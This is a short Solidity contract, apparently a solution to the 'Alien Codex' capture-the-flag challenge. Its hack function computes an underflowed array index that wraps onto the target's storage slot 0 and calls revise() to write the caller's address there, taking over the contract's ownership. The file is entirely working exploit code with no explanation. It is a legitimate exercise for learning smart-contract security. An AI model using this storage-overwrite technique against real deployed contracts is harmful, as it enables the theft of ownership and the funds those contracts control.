// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AllienCodexHack {

    function hack(address _alienCodex) external {
        // unchecked is necessary to allow overflow and underflow 
        unchecked {
            uint256 index = uint256(2)**256 - uint256(keccak256(abi.encodePacked(uint256(1))));
            (bool success, ) = _alienCodex.call(abi.encodeWithSignature('revise(uint256,bytes32)', index, bytes32(uint256(uint160(msg.sender)))));
            require(success);
        }        
    }

    function getIndex() external pure returns(uint256 index) {
        // unchecked is necessary to allow overflow and underflow 
        unchecked {
            index = uint256(2)**256 - uint256(keccak256(abi.encodePacked(uint256(1))));
        }        
    }
}